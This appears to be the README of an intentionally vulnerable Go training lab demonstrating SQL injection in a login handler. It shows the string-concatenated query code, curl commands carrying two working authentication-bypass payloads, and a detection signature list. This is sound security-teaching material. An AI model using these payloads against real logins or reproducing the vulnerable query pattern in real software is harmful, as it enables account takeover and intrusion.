# sqli-login

⚠️ **Intentionally vulnerable — local lab only.** Binds to `127.0.0.1` only,
never expose this beyond localhost, never deploy it anywhere real.

## Vulnerability

**CWE-89 — SQL Injection**, classic string-concatenation flavor.

The login handler builds its SQL with `fmt.Sprintf` instead of a
parameterized query:

```go
// query.go — INTENTIONALLY VULNERABLE: string-concatenated SQL, do not copy this pattern.
fmt.Sprintf(
    "SELECT id, username, role FROM users WHERE username = '%s' AND password_hash = '%s'",
    username, password,
)
```

Because `username`/`password` are spliced directly into the SQL text, any
value containing SQL metacharacters (`'`, `--`, `;`) changes the *shape* of
the query instead of being treated as inert data. This lab isolates the
query-building logic (`buildLoginQuery` in `query.go`) from execution
specifically so the injection can be proven with a plain unit test — no
database required — by asserting the raw payload survives unescaped into
the returned SQL string. See `query_test.go`.

## Exploit

Comment out the password check entirely and log in as any known user
without knowing their password:

```sh
curl -i -d "username=admin' -- &password=x" http://127.0.0.1:18004/login
```

The trailing `-- ` turns everything after `username = 'admin'` into a SQL
comment, so the query Postgres actually evaluates is effectively:

```sql
SELECT id, username, role FROM users WHERE username = 'admin' -- ' AND password_hash = 'x'
```

...i.e. the `password_hash` check never happens. The response grants a
session as `admin` regardless of the `password` field's value.

The classic tautology form also works:

```sh
curl -i -d "username=' OR '1'='1' -- &password=irrelevant" http://127.0.0.1:18004/login
```

A successful bypass returns `200` with a JSON body containing a `session`
token and the hijacked user's `username`/`role`, and sets a `session`
cookie usable against `GET /api/me`.

## Endpoints

- `POST /login` — form fields `username`, `password`. Runs the vulnerable
  query path (`Store.LoginRaw` → `buildLoginQuery` → `QueryRowContext`
  against real Postgres in production). On success, issues a session
  cookie and returns the logged-in user as JSON.
- `GET /api/me` — returns the current session's user (via `session` cookie
  or `Authorization: Bearer <token>`), or `401` if there's no valid
  session.

## Detection heuristic

Every submitted `username`/`password` is checked against a crude
metacharacter allowlist violation (`'`, `--`, `;`) — the kind of thing a
real WAF or log-scraper might do. A hit logs loudly:

```
[SQLI SUSPECTED] remote=127.0.0.1:54321 username="admin' -- " password="x"
```

...and (if `TRACKER_URL` is set) fires a best-effort, non-blocking,
2-second-timeout JSON `POST` to that URL tagging the event
`"event": "sqli_suspected"`, mirroring the beacon pattern used by sibling
lab servers so `labs/servers/trackercollector` (or the real
`pkg/ncer`/`omnisec-mitm` pipeline sniffing the loopback traffic) can
observe it.

Note this heuristic does **not** block the request — the vulnerable query
still executes either way. It only exists to make the attempt observable.

For the ncer/mitm pipeline itself (rather than this app-level log line),
the interesting signal on `/login` is likely one of:
- **Body-length/pattern novelty** — legitimate logins have fairly uniform
  `username=...&password=...` body shapes; injection payloads
  (`' OR '1'='1' -- `, etc.) are longer and structurally different, which
  is exactly the kind of outlier `pkg/ncer`'s novelty scoring is meant to
  flag.
- **A WAF-style content signature** the user could add to the pipeline —
  e.g. matching `'`, `--`, `;`, `UNION SELECT`, etc. in POST bodies to
  `/login`-shaped endpoints, similar to the heuristic this server already
  applies at the application layer.

## Environment variables

| Var | Default | Purpose |
|---|---|---|
| `LISTEN_ADDR` | `127.0.0.1:18004` | HTTP listen address |
| `DATABASE_URL` | `postgres://labs:labs_lab_pw@127.0.0.1:55432/labs_sqli_login?sslmode=disable` | Postgres DSN |
| `TRACKER_URL` | unset | If set, beacons `sqli_suspected` events here |

## Database

Schema/seed: `labs/servers/db/postgres/init/04-sqli-login.sql`. Seeds three
users (`user`, `moderator`, `admin`) with intentionally plaintext
`password_hash` values (see that file's comments — this is a documented
simplification to keep the SQLi demo self-contained, not a second bug).

## Running

```sh
go build ./...
LISTEN_ADDR=127.0.0.1:18004 DATABASE_URL=postgres://labs:labs_lab_pw@127.0.0.1:55432/labs_sqli_login?sslmode=disable ./sqli-login
```

## Tests

```sh
go test ./... -v
```

All tests run without a live database:
- `query_test.go` — unit tests on `buildLoginQuery` proving the raw
  injection payload reaches the SQL string unescaped (the authoritative
  proof of the vulnerability).
- `store_test.go` — `fakeSQLStore`, a hand-rolled interpreter that
  recognizes only the two classic bypass shapes exercised in this lab, used
  purely to demonstrate the bypass end-to-end in tests without a live DB.
- `main_test.go` — `httptest`-based end-to-end tests, including
  `TestLogin_SQLiAuthBypass`, which submits `admin' -- ` as the username
  with a wrong password and confirms the server grants a working admin
  session.
